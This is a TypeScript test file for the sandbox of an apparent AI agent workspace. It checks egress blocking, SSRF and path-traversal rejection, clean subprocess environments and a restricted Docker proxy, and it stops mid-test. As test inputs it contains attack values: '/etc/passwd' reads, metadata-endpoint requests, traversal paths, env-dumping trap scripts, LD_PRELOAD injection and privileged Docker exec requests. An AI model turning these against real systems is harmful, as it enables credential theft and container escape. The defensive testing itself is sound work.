import assert from 'node:assert/strict';
import { execFile, spawn } from 'node:child_process';
import { createHash, randomUUID } from 'node:crypto';
import { EventEmitter } from 'node:events';
import { existsSync, type BigIntStats } from 'node:fs';
import fs from 'node:fs/promises';
import {
  chmod,
  lstat,
  mkdir,
  mkdtemp,
  open,
  readFile,
  readdir,
  realpath,
  rename,
  rm,
  symlink,
  truncate,
  utimes,
  writeFile,
} from 'node:fs/promises';
import { syncBuiltinESMExports } from 'node:module';
import { tmpdir } from 'node:os';
import { PassThrough } from 'node:stream';
import { basename, join } from 'node:path';
import test from 'node:test';
import Fastify from 'fastify';
import { promisify } from 'node:util';
import { parse } from 'yaml';
import type { WorkspaceSession } from '../src/ports/computer.ts';
import { threadIdentity } from '../src/ports/thread-identity.ts';
import { isPublicAddress, publicUrl } from '../src/providers/agent-browser/network.ts';
import {
  connectedUser,
  runWorkspaceCommand,
  WorkspaceCommandError,
  type WorkspaceCommandLauncher,
} from '../src/providers/docker/command.ts';
import {
  artifactReadProgram,
  artifactWriteProgram,
  createCommandWorkspace,
  createDockerWorkspace,
  workspaceFile,
} from '../src/providers/docker/index.ts';
import { runProcess, serviceEnvironment } from '../src/providers/process.ts';
import { prepareLocalDirectories } from '../scripts/local-database.ts';
import { createSandbox } from '../src/providers/pi/sandbox.ts';
import { setTimeout as delay } from 'node:timers/promises';
import { createLocalFiles, localFileRules } from '../src/server/local-files.ts';
import { computerAppRule, createComputerUse, systemShortcut } from '../src/server/computer-use.ts';
import { fileBytes } from '../src/shared/files.ts';
import type { Pool } from 'pg';

if (process.env.NOD_TEST_WORKSPACE_IMAGE)
  test(
    'workspace egress blocks private and metadata sockets in both Compose deployments',
    { timeout: 120_000 },
    async (t) => {
      const image = process.env.NOD_TEST_WORKSPACE_IMAGE!;
      const root = await mkdtemp(join(tmpdir(), 'nod-workspace-network-'));
      const name = `nod-egress-${randomUUID()}`;
      const docker = async (...args: string[]) =>
        (await promisify(execFile)('docker', args, { timeout: 30_000 })).stdout.trim();
      const networks = ['private', 'metadata', 'public'].map((kind) => `${name}-${kind}`);
      const fixture = `${name}-fixture`;
      const segment = Math.floor(Math.random() * 200) + 20;
      const privateAddress = `10.71.${segment}.2`;
      const ipv6Address = `fd71:${segment}::2`;
      const publicIpv6Address = `2606:4700:71:${segment}::2`;
      const publicAddress = '93.184.216.34';
      const metadataAddress = '169.254.169.254';
      const config = join(root, 'compose.json');
      const compose = (...args: string[]) => docker('compose', '-p', name, '-f', config, ...args);
      t.after(async () => {
        await compose('down', '--volumes', '--remove-orphans').catch(() => {});
        await docker('rm', '-f', fixture).catch(() => {});
        for (const network of networks) await docker('network', 'rm', network).catch(() => {});
        await rm(root, { recursive: true, force: true });
      });
      await docker(
        'network',
        'create',
        '--internal',
        '--subnet',
        `10.71.${segment}.0/24`,
        '--ipv6',
        '--subnet',
        `fd71:${segment}::/64`,
        networks[0]!,
      );
      await docker('network', 'create', '--internal', '--subnet', '169.254.0.0/16', networks[1]!);
      await docker(
        'network',
        'create',
        '--internal',
        '--subnet',
        '93.184.216.0/24',
        '--ipv6',
        '--subnet',
        `2606:4700:71:${segment}::/64`,
        networks[2]!,
      );
      await docker(
        'run',
        '-d',
        '--name',
        fixture,
        '--network',
        networks[0]!,
        '--ip',
        privateAddress,
        '--ip6',
        ipv6Address,
        '--network-alias',
        'private-fixture',
        '--cap-drop',
        'ALL',
        '--entrypoint',
        'python3',
        image,
        '-u',
        '-c',
        `
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
class Server(HTTPServer):
    address_family = socket.AF_INET6
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302 if self.path == '/redirect' else 200)
        if self.path == '/redirect':
            self.send_header('Location', 'http://${metadataAddress}:8080/')
        self.end_headers()
        self.wfile.write(b'synthetic network fixture')
Server(('::', 8080), Handler).serve_forever()
`,
      );
      await docker('network', 'connect', '--ip', metadataAddress, networks[1]!, fixture);
      await docker(
        'network',
        'connect',
        '--ip',
        publicAddress,
        '--ip6',
        publicIpv6Address,
        '--alias',
        'public-fixture',
        networks[2]!,
        fixture,
      );
      const read = (address: string, path = '/') =>
        `const response=await fetch('http://${address}:8080${path}',{signal:AbortSignal.timeout(1500)});if(response.status!==200)throw new Error('Fixture failed');console.log(await response.text());`;
      for (const [network, address] of [
        [networks[0]!, privateAddress],
        [networks[0]!, `[${ipv6Address}]`],
        [networks[1]!, metadataAddress],
        [networks[2]!, publicAddress],
        [networks[2]!, `[${publicIpv6Address}]`],
      ])
        assert.equal(
          await docker(
            'run',
            '--rm',
            '--network',
            network,
            '--entrypoint',
            'node',
            image,
            '-e',
            read(address),
          ),
          'synthetic network fixture',
        );
      for (const file of ['../compose.yaml', '../deployment/self-host/compose.yaml']) {
        const source = parse(await readFile(new URL(file, import.meta.url), 'utf8'));
        const workspace = {
          ...source.services.workspace,
          image,
          container_name: `${name}-workspace`,
          volumes: [],
        };
        delete workspace.build;
        const guard = {
          ...source.services['workspace-network'],
          image,
          container_name: `${name}-network`,
          networks: ['private', 'metadata', 'public'],
        };
        const deployment = {
          services: { workspace, 'workspace-network': guard },
          networks: Object.fromEntries(
            ['private', 'metadata', 'public'].map((kind, index) => [
              kind,
              { external: true, name: networks[index] },
            ]),
          ),
        };
        await writeFile(config, JSON.stringify(deployment));
        await compose('up', '-d', '--no-build', '--wait', '--wait-timeout', '15');
        const request = (address: string, path = '/') =>
          compose('exec', '-T', 'workspace', 'node', '-e', read(address, path));
        assert.equal(await request(publicAddress), 'synthetic network fixture');
        assert.equal(await request('public-fixture'), 'synthetic network fixture');
        await compose(
          'exec',
          '-T',
          'workspace',
          'node',
          '-e',
          `const {createServer}=await import('node:http');const server=createServer((_,response)=>response.end('synthetic loopback'));await new Promise(resolve=>server.listen(8080,'127.0.0.1',resolve));try{if(await(await fetch('http://127.0.0.1:8080')).text()!=='synthetic loopback')throw new Error('Loopback failed')}finally{server.closeAllConnections();server.close()}`,
        );
        for (const address of [
          privateAddress,
          metadataAddress,
          'private-fixture',
          `[${ipv6Address}]`,
          `[${publicIpv6Address}]`,
        ])
          await assert.rejects(request(address), /fetch failed|TimeoutError/);
        await assert.rejects(request(publicAddress, '/redirect'), /fetch failed|TimeoutError/);
        await assert.rejects(
          compose('exec', '-T', '--user', 'root', 'workspace', 'iptables', '-F', 'OUTPUT'),
          /Permission denied|Operation not permitted/,
        );
        await compose('restart', 'workspace-network');
        assert.equal(await request(publicAddress), 'synthetic network fixture');
        await assert.rejects(request(metadataAddress), /fetch failed|TimeoutError/);
        await compose('down');
        guard.entrypoint = ['sh', '-c', 'exit 1'];
        guard.restart = 'no';
        await writeFile(config, JSON.stringify(deployment));
        await assert.rejects(compose('up', '-d', '--no-build', '--wait', '--wait-timeout', '5'));
        assert.equal(await compose('ps', '--status', 'running', '--quiet', 'workspace'), '');
        await compose('down');
      }
    },
  );

test('local startup protects data through its private root and preserves workspace mount traversal', async () => {
  const parent = await mkdtemp(join(tmpdir(), 'nod-local-directories-'));
  const root = join(parent, 'data');
  const workspace = join(root, 'workspaces');
  const unrelated = join(parent, 'unrelated');
  try {
    await chmod(parent, 0o755);
    await prepareLocalDirectories(root);
    assert.equal((await lstat(root)).mode & 0o777, 0o700);
    assert.equal((await lstat(workspace)).mode & 0o777, 0o755);
    assert.equal((await lstat(parent)).mode & 0o777, 0o755);
    await writeFile(join(workspace, 'retained.txt'), 'synthetic retained workspace');
    await chmod(root, 0o755);
    await chmod(workspace, 0o755);
    await prepareLocalDirectories(root);
    assert.equal((await lstat(root)).mode & 0o777, 0o700);
    assert.equal((await lstat(workspace)).mode & 0o777, 0o755);
    assert.equal(
      await readFile(join(workspace, 'retained.txt'), 'utf8'),
      'synthetic retained workspace',
    );
    assert.equal((await lstat(parent)).mode & 0o777, 0o755);
    await mkdir(unrelated, { mode: 0o755 });
    await symlink(unrelated, join(parent, 'linked-data'));
    await assert.rejects(prepareLocalDirectories(join(parent, 'linked-data')));
    assert.equal((await lstat(unrelated)).mode & 0o777, 0o755);
  } finally {
    await rm(parent, { recursive: true, force: true });
  }
});

// Workspace containment, host isolation and subprocess environment.

test('public web validation rejects local, private, rebinding and credential URLs', async () => {
  for (const address of [
    '127.0.0.1',
    '10.0.0.1',
    '172.20.1.2',
    '192.168.1.2',
    '169.254.169.254',
    '192.0.0.8',
    '192.0.2.1',
    '100.100.100.200',
    '0.0.0.0',
    '::1',
    '::ffff:127.0.0.1',
    'fd00::1',
    '2001:db8::1',
    '2002:7f00:1::',
    '3fff::1',
    '3fff:fff::1',
    '2::1',
    '64:ff9b::127.0.0.1',
    '64:ff9b::10.0.0.1',
    '64:ff9b:1::93.184.216.34',
  ])
    assert.equal(isPublicAddress(address), false, address);
  for (const address of [
    '93.184.216.34',
    '192.0.66.239',
    '1.1.1.1',
    '2001:4860:4860::8888',
    '2606:4700:4700::1111',
    '64:ff9b::93.184.216.34',
  ])
    assert.equal(isPublicAddress(address), true, address);
  for (const url of [
    'file:///etc/passwd',
    'http://localhost',
    'http://2130706433',
    'http://[::1]',
    'https://user:secret@example.com',
    'https://example.com:9222',
  ])
    await assert.rejects(publicUrl(url));
  await assert.rejects(
    publicUrl('https://example.com', async () => [
      { address: '93.184.216.34', family: 4 },
      { address: '10.0.0.1', family: 4 },
    ]),
  );
  assert.equal(
    (await publicUrl('https://example.com', async () => [{ address: '93.184.216.34', family: 4 }]))
      .address,
    '93.184.216.34',
  );
});

test('workspace paths cannot address host files or other task directories', () => {
  assert.equal(workspaceFile('task-a', 'report.txt'), '/workspace/task-a/report.txt');
  assert.equal(
    workspaceFile('task-a', '/workspace/task-a/report.txt'),
    '/workspace/task-a/report.txt',
  );
  for (const path of [
    '/etc/passwd',
    '../task-b/private.txt',
    '..\\secret',
    'file\0name',
    'C:\\Users\\owner\\private.txt',
    '\\\\server\\share\\private.txt',
  ])
    assert.throws(() => workspaceFile('task-a', path));
  assert.throws(() => threadIdentity('../escape'));
});

test('runtime subprocesses do not inherit provider keys and stop at bounds', async () => {
  const previous = process.env.OPENAI_API_KEY;
  process.env.OPENAI_API_KEY = 'test-secret-not-for-child';
  try {
    assert.equal(serviceEnvironment().OPENAI_API_KEY, undefined);
    const result = await runProcess(process.execPath, [
      '-e',
      'process.stdout.write(String(process.env.OPENAI_API_KEY)); process.stderr.write("fixture-error")',
    ]);
    assert.equal(result.stdout, 'undefined');
    assert.equal(result.stderr, 'fixture-error');
    await assert.rejects(
      runProcess(process.execPath, ['-e', 'setTimeout(()=>{},5000)'], { timeoutMs: 30 }),
      /limit/,
    );
  } finally {
    if (previous === undefined) delete process.env.OPENAI_API_KEY;
    else process.env.OPENAI_API_KEY = previous;
  }
});

// Supervised workspace commands: cancellation, bounds, uncertain fencing and file containment.

async function execute(session: WorkspaceSession, command: string) {
  const chunks: Buffer[] = [];
  const { exitCode } = await session.exec(command, { onData: (chunk) => chunks.push(chunk) });
  const output = Buffer.concat(chunks).toString('utf8');
  if (exitCode) throw new Error(`Workspace command exited with ${exitCode}: ${output}`);
  return output;
}

async function local(programPrefix = '') {
  const directory = await mkdtemp('/tmp/nod-command-');
  const launch: WorkspaceCommandLauncher = (_command, args, options) =>
    spawn('python3', ['-u', '-c', programPrefix + args.at(-1)!], {
      ...options,
      cwd: directory,
      stdio: 'pipe',
    });
  return {
    directory,
    run: (args: string[], options: Partial<Parameters<typeof runWorkspaceCommand>[0]> = {}) =>
      runWorkspaceCommand({
        container: 'nod-workspace-fixture',
        threadId: 'fixture',
        args,
        spawn: launch,
        ...options,
      }),
    close: () => rm(directory, { recursive: true, force: true }),
  };
}
async function exists(path: string) {
  try {
    await readFile(path);
    return true;
  } catch {
    return false;
  }
}

test('connected CLIs run only their sealed install with a clean environment', async () => {
  const root = await mkdtemp('/tmp/nod-connected-');
  const home = join(root, 'home');
  const node = join(root, 'node');
  const stolen = join(root, 'stolen');
  const trap = `#!/bin/sh\nenv > ${stolen}\n`;
  try {
    await mkdir(home, { mode: 0o700 });
    await mkdir(join(node, 'lib', 'node_modules', 'fixturecli'), { recursive: true });
    await mkdir(join(node, 'bin'));
    for (const name of ['fixturecli', 'python3', 'sh', 'npm', 'curl'])
      await writeFile(join(node, 'bin', name), trap, { mode: 0o755 });
    await writeFile(
      join(node, 'lib', 'node_modules', 'fixturecli', 'cli.js'),
      `require('fs').writeFileSync(${JSON.stringify(stolen)}, JSON.stringify(process.env))`,
    );
    await writeFile(
      join(node, 'sitecustomize.py'),
      `open(${JSON.stringify(stolen)},'w').write('python')`,
    );
    const cli = { id: randomUUID(), command: 'fixturecli', source: { npm: 'fixturecli' } };
    const prefix = join(home, `nod-cli-${cli.id}`);
    await mkdir(join(prefix, 'bin'), { recursive: true });
    await writeFile(join(prefix, 'bin', 'fixturecli'), '#!/bin/sh\nenv\necho "argv $*"\n', {
      mode: 0o755,
    });
    await writeFile(join(prefix, '.installed'), '');
    const launches: string[][] = [];
    const run = (
      args: string[],
      selected?: typeof cli,
      fields: Record<string, string> = { FIXTURE_TOKEN: 'synthetic-connected-token' },
    ) =>
      runWorkspaceCommand({
        container: 'nod-workspace-fixture',
        threadId: 'fixture',
        args,
        environment: fields,
        cli: selected,
        spawn: (_command, dockerArgs, options) => {
          launches.push(dockerArgs);
          const argv = dockerArgs.slice(dockerArgs.indexOf('nod-workspace-fixture') + 1);
          return spawn(argv[0]!, argv.slice(1), {
            ...options,
            cwd: home,
            env: {
              PATH: `${join(node, 'bin')}:/usr/bin:/bin`,
              NPM_CONFIG_PREFIX: node,
              NODE_PATH: join(node, 'lib', 'node_modules'),
              NODE_OPTIONS: `--require ${join(node, 'lib', 'node_modules', 'fixturecli', 'cli.js')}`,
              PYTHONPATH: node,
              PIPX_BIN_DIR: join(node, 'bin'),
            },
            stdio: 'pipe',
          });
        },
      });
    const result = await run(['status', '--json'], cli);
    assert.equal(result.exitCode, 0, result.stderr.toString());
    const lines = result.stdout.toString().trim().split('\n');
    assert.equal(lines.at(-1), 'argv status --json');
    const environment = Object.fromEntries(
      lines
        .slice(0, -1)
        .map((line) => line.split(/=(.*)/s).slice(0, 2))
        .filter(([key]) => !['PWD', 'OLDPWD', 'SHLVL', '_'].includes(key!)),
    );
    assert.deepEqual(Object.keys(environment).sort(), [
      'FIXTURE_TOKEN',
      'HOME',
      'LANG',
      'PATH',
      'XDG_CONFIG_HOME',
    ]);
    assert.equal(
      environment.PATH,
      `${await realpath(prefix)}/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`,
    );
    assert.equal(existsSync(environment.HOME!), false);
    assert.deepEqual(launches[0]!.slice(0, 6), [
      'exec',
      '-i',
      '--user',
      `${connectedUser(cli)}:1002`,
      '--workdir',
      '/var/tmp',
    ]);
    assert.deepEqual(launches[0]!.slice(7, 9), ['/usr/bin/python3', '-I']);
    const fields = {
      FIXTURE_USERNAME: 'synthetic-user',
      FIXTURE_USER: 'synthetic-user',
      FIXTURE_EMAIL: 'synthetic@example.test',
      FIXTURE_URL: 'https://synthetic.example.test',
      FIXTURE_ID: '42',
    };
    const labeled = await run(['status'], cli, fields);
    assert.equal(labeled.exitCode, 0, labeled.stderr.toString());
    for (const [key, value] of Object.entries(fields))
      assert(labeled.stdout.toString().split('\n').includes(`${key}=${value}`));
    for (const key of [
      'LD_PRELOAD',
      'NODE_OPTIONS',
      'PATH',
      'PYTHONPATH',
      `${'X'.repeat(65)}_TOKEN`,
    ]) {
      await assert.rejects(
        run(['status'], cli, { [key]: 'synthetic-value' }),
        WorkspaceCommandError,
      );
    }
    await assert.rejects(run(['fixturecli']), WorkspaceCommandError);
    const other = join(home, `nod-cli-${randomUUID()}`);
    await mkdir(other);
    const sharing = await run(['status'], cli);
    assert.equal(sharing.exitCode, 126);
    assert.match(sharing.stderr.toString(), /not sealed/);
    await rm(other, { recursive: true });
    const shared = join(root, 'shared');
    await mkdir(shared);
    await chmod(shared, 0o777);
    await writeFile(join(shared, 'fixturecli'), trap, { mode: 0o755 });
    await rm(join(prefix, 'bin', 'fixturecli'));
    await symlink(join(shared, 'fixturecli'), join(prefix, 'bin', 'fixturecli'));
    const escaped = await run(['status'], cli);
    assert.equal(escaped.exitCode, 126);
    assert.match(escaped.stderr.toString(), /not sealed/);
    await chmod(root, 0o777);
    await assert.rejects(run(['status'], cli), WorkspaceCommandError);
    assert.equal(existsSync(stolen), false);
  } finally {
    await chmod(root, 0o700);
    await rm(root, { recursive: true, force: true });
  }
});

function fakeDocker(check: (args: string[]) => Promise<{ code: number; stderr?: string }>) {
  const launches: Array<{
    workdir: string;
    request: Promise<{ args: string[] }>;
    cancelled: Promise<void>;
    child: ReturnType<WorkspaceCommandLauncher> & EventEmitter;
  }> = [];
  const launch: WorkspaceCommandLauncher = (_command, args) => {
    const child = Object.assign(new EventEmitter(), {
      stdin: new PassThrough(),
      stdout: new PassThrough(),
      stderr: new PassThrough(),
      kill() {
        return true;
      },
    });
    let received: (request: { args: string[] }) => void = () => {};
    let cancel: () => void = () => {};
    const request = new Promise<{ args: string[] }>((resolve) => (received = resolve));
    const cancelled = new Promise<void>((resolve) => (cancel = resolve));
    let buffered = '';
    child.stdin.on('data', (chunk: Buffer) => {
      buffered += chunk.toString();
      for (let end = buffered.indexOf('\n'); end >= 0; end = buffered.indexOf('\n')) {
        const line = buffered.slice(0, end);
        buffered = buffered.slice(end + 1);
        if (line === '{"type":"cancel"}') cancel();
        else received(JSON.parse(line));
      }
    });
    const index = launches.length;
    launches.push({
      workdir: args[args.indexOf('--workdir') + 1]!,
      request,
      cancelled,
      child: child as unknown as ReturnType<WorkspaceCommandLauncher> & EventEmitter,
    });
    void request.then(({ args }) => {
      if (args.at(-1)?.split('\n').at(-1) === 'ok') setImmediate(() => exit(index, 0));
      else if (args[0] === '/usr/bin/python3')
        void check(args).then(({ code, stderr }) => exit(index, code, null, stderr));
    });
    return child as unknown as ReturnType<WorkspaceCommandLauncher>;
  };
  const exit = (index: number, code: number, reason: string | null = null, stderr = '') => {
    const { child } = launches[index]!;
    if (stderr)
      child.stdout.emit(
        'data',
        JSON.stringify({ type: 'stderr', data: Buffer.from(stderr).toString('base64') }) + '\n',
      );
    child.stdout.emit('data', JSON.stringify({ type: 'exit', code, reason }) + '\n');
    child.emit('close', 0);
  };
  const workspace = createDockerWorkspace({
    container: 'nod-workspace-fixture',
    workspaceRoot: '/synthetic',
    spawn: launch,
  });
  const session = workspace.open({
    threadId: 'fixture',
    workspacePath: '/synthetic/fixture',
    signal: new AbortController().signal,
  });
  return { launches, workspace, session, exit };
}

test('an uncertain command is stopped once and the workspace keeps working', async () => {
  const docker = fakeDocker(async () => ({ code: 0 }));
  const first = execute(docker.session, 'first');
  const second = execute(docker.session, 'second');
  try {
    docker.launches[0]!.child.stderr.emit('data', 'synthetic transport error\n');
    docker.launches[0]!.child.emit('close', 1);
    await docker.launches[1]!.cancelled;
    docker.exit(1, -15, 'cancelled');
    await assert.rejects(second, /Task cancelled/);
    const failure = await first.then(
      () => assert.fail('The first command should not finish.'),
      (error: Error) => error,
    );
    assert.equal(await execute(docker.session, 'ok'), '');
    assert.match(
      failure.message,
      /did not stop safely: its command stream closed before the command confirmed it finished \(exit code 1: synthetic transport error\)\. Its processes are confirmed stopped and its result is unknown\. The workspace is available\./,
    );
    const requests = await Promise.all(docker.launches.map(({ request }) => request));
    assert.deepEqual(
      requests.map(({ args }) => args.at(-1)?.split('\n').at(-1)),
      ['first', 'second', '/proc', 'ok'],
    );
    assert.deepEqual(
      docker.launches.map(({ workdir }) => workdir),
      ['/workspace/fixture', '/workspace/fixture', '/var/tmp', '/workspace/fixture'],
    );
    assert.deepEqual(requests[2]!.args.slice(0, 3), ['/usr/bin/python3', '-I', '-c']);
  } finally {
    await docker.workspace.dispose();
    await Promise.allSettled([first, second]);
  }
});

test('a command Nod stops at its output limit names the limit, and a Stop stays cancelled', async () => {
  const docker = fakeDocker(async () => ({ code: 0 }));
  try {
    const flooding = docker.session.exec('flood');
    await docker.launches[0]!.request;
    const frame =
      JSON.stringify({ type: 'stdout', data: Buffer.alloc(16384).toString('base64') }) + '\n';
    for (let sent = 0; sent <= 16 * 1024 * 1024; sent += 16384)
      docker.launches[0]!.child.stdout.emit('data', frame);
    await docker.launches[0]!.cancelled;
    docker.exit(0, -15, 'cancelled');
    await assert.rejects(flooding, {
      uncertain: false,
      message: 'Workspace command output passed its 16 MB limit.',
    });

    const stop = new AbortController();
    const stopped = docker.session.exec('stopped', { signal: stop.signal });
    await docker.launches[1]!.request;
    stop.abort();
    await docker.launches[1]!.cancelled;
    docker.exit(1, -15, 'cancelled');
    await assert.rejects(stopped, { uncertain: false, message: 'Task cancelled.' });

    const installing = docker.session.exec('install');
    await docker.launches[2]!.request;
    docker.exit(2, -15, 'install');
    await assert.rejects(installing, {
      uncertain: false,
      message: 'The connected CLI install ran longer than its 600-second limit.',
    });
  } finally {
    await docker.workspace.dispose();
  }
});

test('the workspace stays fenced when a live process cannot be read', async () => {
  const proc = await mkdtemp(join(tmpdir(), 'nod-proc-'));
  await mkdir(join(proc, '1'));
  await writeFile(join(proc, '1', 'stat'), `1 (docker-init) S 0 1 1${' 0'.repeat(16)} 5`);
  await writeFile(join(proc, '1', 'cmdline'), '/sbin/docker-init\0--\0/usr/bin/sleep\0');
  await mkdir(join(proc, '4242', 'stat'), { recursive: true });
  const docker = fakeDocker(async (args) => {
    try {
      await promisify(execFile)('python3', ['-I', '-c', args[3]!, proc]);
      return { code: 0 };
    } catch (error) {
      return { code: 1, stderr: (error as { stderr: string }).stderr };
    }
  });
  const first = execute(docker.session, 'first');
  const reason =
    /did not stop safely: .*Nod could not confirm that its processes stopped: Nod could not read process 4242: \[Errno 21\] Is a directory: .*\. Restart Nod before continuing\./;
  try {
    docker.launches[0]!.child.emit('close', 137);
    await assert.rejects(first, reason);
    await assert.rejects(execute(docker.session, 'ok'), reason);
    assert.equal(docker.launches.length, 2);
  } finally {
    await docker.workspace.dispose();
    await Promise.allSettled([first]);
    await rm(proc, { recursive: true, force: true });
  }
});

if (process.env.NOD_TEST_WORKSPACE_IMAGE)
  test(
    'recovery ends a fully detached process even after the command removed its folder',
    { timeout: 120_000 },
    async (t) => {
      const container = `nod-workspace-recovery-${randomUUID().slice(0, 8)}`;
      const docker = async (...args: string[]) =>
        (await promisify(execFile)('docker', args, { timeout: 30_000 })).stdout.trim();
      t.after(() => docker('rm', '-f', container).catch(() => {}));
      await docker(
        'run',
        '-d',
        '--init',
        '--network',
        'none',
        '--name',
        container,
        '--entrypoint',
        '/usr/bin/sleep',
        process.env.NOD_TEST_WORKSPACE_IMAGE!,
        'infinity',
      );
      const threadId = randomUUID();
      await docker('exec', '--user', 'node', container, 'mkdir', `/workspace/${threadId}`);
      const daemons = async () =>
        Number(
          await docker(
            'exec',
            '--user',
            'node',
            container,
            'python3',
            '-c',
            [
              'import os',
              'def match(pid):',
              ' try: return open(f"/proc/{pid}/cmdline","rb").read()==b"/usr/bin/sleep\\x00301\\x00"',
              ' except OSError: return False',
              'print(sum(match(pid) for pid in os.listdir("/proc") if pid.isdigit()))',
            ].join('\n'),
          ),
        );
      const run = (script: string) =>
        runWorkspaceCommand({ container, threadId, args: ['bash', '-c', script] });
      const error = await run(
        'python3 -c \'import os,sys\nif os.fork(): sys.exit()\nos.setsid()\nif os.fork(): sys.exit()\nos.execve("/usr/bin/sleep",["/usr/bin/sleep","301"],{})\'; cd /; rm -r "/workspace/${threadId}"; sleep 1; kill -9 $PPID',
      ).then(
        () => assert.fail('The command should not finish.'),
        (error: unknown) => error,
      );
      assert.ok(error instanceof WorkspaceCommandError && error.uncertain && error.stop);
      assert.equal(await daemons(), 1);
      await error.stop();
      assert.equal(await daemons(), 0);
      assert.equal(await docker('inspect', '-f', '{{.State.Running}}', container), 'true');
      await docker('exec', '--user', 'node', container, 'mkdir', `/workspace/${threadId}`);
      assert.equal((await run('echo available')).stdout.toString(), 'available\n');
    },
  );

test('workspace uploads transfer binary chunks atomically and reject symlink directories', async () => {
  const f = await local();
  const outside = await mkdtemp('/tmp/nod-upload-outside-');
  let launches = 0;
  const workspace = createCommandWorkspace({
    workspaceRoot: f.directory,
    instructions: 'fixture',
    runCommand: async (_id, args, input) => {
      launches++;
      const request = JSON.parse(input.input!);
      assert.ok([artifactWriteProgram, artifactReadProgram].includes(args.at(-1)!));
      request.base = f.directory;
      return f.run(args, { ...input, input: JSON.stringify(request) });
    },
  });
  try {
    const bytes = Buffer.alloc(16 * 1024 * 1024 + 13);
    for (let i = 0; i < bytes.length; i++) bytes[i] = i % 256;
    await workspace.writeArtifact('fixture', 'nested/file.bin', bytes);
    assert.deepEqual(
      Buffer.from(await workspace.readArtifact('fixture', 'nested/file.bin', bytes.length)),
      bytes,
    );
    await symlink(outside, join(f.directory, 'escape'));
    await assert.rejects(
      workspace.writeArtifact('fixture', 'escape/private.bin', bytes),
      /workspace file operation failed/,
    );
    assert.equal(await exists(join(outside, 'private.bin')), false);
    const before = launches;
    await assert.rejects(
      workspace.writeArtifact('fixture', '../foreign/file', bytes),
      /stay within/,
    );
    assert.equal(launches, before);
    await assert.rejects(
      workspace.readArtifact('fixture', 'nested/file.bin', bytes.length - 1),
      /workspace file operation failed/,
    );
  } finally {
    await workspace.dispose();
    await f.close();
    await rm(outside, { recursive: true, force: true });
  }
});

test('self-hosted runtime limits Docker access to unprivileged execution in its two containers', async () => {
  const { createServer } = await import('node:http');
  const { createRuntimeProxy } = await import(
    new URL('../deployment/self-host/docker-proxy.mjs', import.meta.url).href
  );
  const root = await mkdtemp(join(tmpdir(), 'nod-runtime-proxy-'));
  const socket = join(root, 'docker.sock');
  const forwarded: Array<{ path: string; body: Record<string, unknown> }> = [];
  const executionId = 'a'.repeat(64);
  const engine = createServer(async (request, response) => {
    const chunks = [];
    for await (const chunk of request) chunks.push(chunk);
    const body = chunks.length ? JSON.parse(Buffer.concat(chunks).toString()) : {};
    forwarded.push({ path: request.url!, body });
    if (request.url?.endsWith('/json')) {
      response.writeHead(200, { 'Content-Type': 'application/json' });
      response.end(
        JSON.stringify({
          Id: 'host-container-id',
          Config: { Env: ['SECRET=synthetic'], Tty: false },
          Mounts: [{ Source: '/host/private' }],
          State: { Running: true, Paused: false, Restarting: false },
        }),
      );
      return;
    }
    response.writeHead(201, { 'Content-Type': 'application/json' });
    response.end(JSON.stringify({ Id: executionId }));
  });
  engine.on('upgrade', (request, stream) => {
    forwarded.push({ path: request.url!, body: {} });
    stream.write('HTTP/1.1 101 UPGRADED\r\nConnection: Upgrade\r\nUpgrade: tcp\r\n\r\n');
    stream.pipe(stream);
  });
  const proxy = createRuntimeProxy({
    socketPath: socket,
    workspace: 'nod-workspace-fixture',
    browser: 'nod-browser-fixture',
  });
  await new Promise<void>((resolve) => engine.listen(socket, resolve));
  await new Promise<void>((resolve) => proxy.listen(0, '127.0.0.1', resolve));
  const address = proxy.address();
  const origin = `http://127.0.0.1:${address.port}`;
  const call = (path: string, body?: unknown, method = body === undefined ? 'GET' : 'POST') =>
    fetch(origin + path, {
      method,
      ...(body !== undefined && {
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      }),
    });
  const command = {
    User: 'node',
    WorkingDir: `/workspace/${randomUUID()}`,
    Cmd: ['python3', '-c', 'print("synthetic")'],
    AttachStdin: true,
    AttachStdout: true,
    AttachStderr: true,
    Tty: false,
    Privileged: false,
  };
  try {
    for (const path of ['/containers/json', '/images/json', '/info'])
      assert.equal((await call(path)).status, 403, path);
    assert.equal((await call('/containers/create', {})).status, 403);
    for (const change of [
      { User: 'root' },
      { User: '0' },
      { Privileged: true },
      { Detach: true },
      { Env: ['SECRET=synthetic'] },
      { WorkingDir: '/' },
      { WorkingDir: '/workspace/../var/tmp' },
      { WorkingDir: '/var/tmp/other' },
      { Tty: true },
      { HostConfig: { Binds: ['/host:/host'] } },
    ])
      assert.equal(
        (await call('/v1.41/containers/nod-workspace-fixture/exec', { ...command, ...change }))
          .status,
        403,
      );
    assert.equal((await call('/containers/unrelated/exec', command)).status, 403);
    assert.equal((await call(`/exec/${executionId}/json`)).status, 403);
    assert.equal(forwarded.length, 0);
    assert.equal((await call('/v1.41/containers/nod-workspace-fixture/exec', command)).status, 201);
    assert.equal(forwarded.length, 1);
    assert.deepEqual(forwarded[0], {
      path: '/v1.41/containers/nod-workspace-fixture/exec',
      body: command,
    });
    const inspection = await call('/containers/nod-workspace-fixture/json');
    assert.equal(inspection.status, 200);
    assert.deepEqual(await inspection.json(), {
      Id: 'nod-workspace-fixture',
      Name: '/nod-workspace-fixture',
      Config: { Tty: false },
      State: { Running: true, Paused: false, Restarting: false },
    });
    assert.equal((await call('/containers/unrelated/json')).status, 403);
    assert.equal(
      (
        await call('/containers/nod-workspace-fixture/exec', {
          ...command,
          User: '24000:1002',
          WorkingDir: '/var/tmp',
        })
      ).status,
      201,
    );
    assert.equal(
      (
        await call('/containers/nod-workspace-fixture/exec', {
          ...command,
          WorkingDir: '/var/tmp',
        })
      ).status,
      201,
    );
    assert.equal(
      (
        await call('/containers/nod-browser-fixture/exec', {
          ...command,
          WorkingDir: '',
          Cmd: ['node', '/app/bridge.mjs'],
        })
      ).status,
      201,
    );
    assert.equal(
      (await call('/containers/nod-browser-fixture/exec', { ...command, Cmd: ['sh'] })).status,
      403,
    );
    assert.equal(
      (await call(`/exec/${executionId}/start`, { Detach: true, Tty: false })).status,
      403,
    );
    assert.equal(
      (await call('/containers/nod-workspace-fixture/exec?unsafe=true', command)).status,
      403,
    );
    const { connect } = await import('node:net');
    const attach = (body: unknown) =>
      new Promise<{ head: string; stream: ReturnType<typeof connect> }>((resolve, reject) => {
        const stream = connect(address.port, '127.0.0.1');
